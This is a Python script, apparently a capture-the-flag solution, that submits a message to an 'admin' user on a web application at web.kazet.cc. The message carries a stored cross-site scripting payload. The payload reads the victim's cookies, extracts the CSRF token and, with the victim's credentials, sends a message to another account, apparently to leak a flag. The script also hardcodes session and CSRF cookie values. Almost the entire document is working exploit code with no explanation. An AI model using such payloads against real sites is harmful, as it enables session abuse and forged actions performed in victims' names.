import requests

content = """
 <script>
  const cookies = document.cookie;
  const csrfTokenMatch = cookies.match(/csrftoken=([^;]+)/);
  const csrfToken = csrfTokenMatch ? csrfTokenMatch[1] : "";

  const data = new URLSearchParams();
  data.append("csrfmiddlewaretoken", csrfToken);
  data.append("recipient", "wulux");
  data.append("content", "FLAG FOR YOU");
  data.append("template", "normal");

  const requestOptions = {
    method: "POST",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Content-Type": "application/x-www-form-urlencoded",
      Origin: "https://web.kazet.cc:42448",
      Referer: "https://web.kazet.cc:42448/create",
      "X-CSRFToken": csrfToken,
    },
    body: data,
    credentials: "include",
  };

  fetch("https://web.kazet.cc:42448/create", requestOptions)
</script>
"""

data = {
    "csrfmiddlewaretoken": "UaDXNxp4LRENtJMa2hmrZLttyXlmWY6CJj51XCHBB9rflAqPJegcAavJm5WyL0eM",
    "recipient": "admin",
    "content": content,
    "template": "normal",
}


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "csrftoken=ZjCekfsH0sXC21OPR74VLzcqYiLmZcik; sessionid=2oqvrfqj6qp00rqd958d51lzamus4iea",
    "Origin": "https://web.kazet.cc:42448",
    "Referer": "https://web.kazet.cc:42448/create",
}

url = "https://web.kazet.cc:42448/create"

requests.post(url, data=data, headers=headers)
print("Sent!")
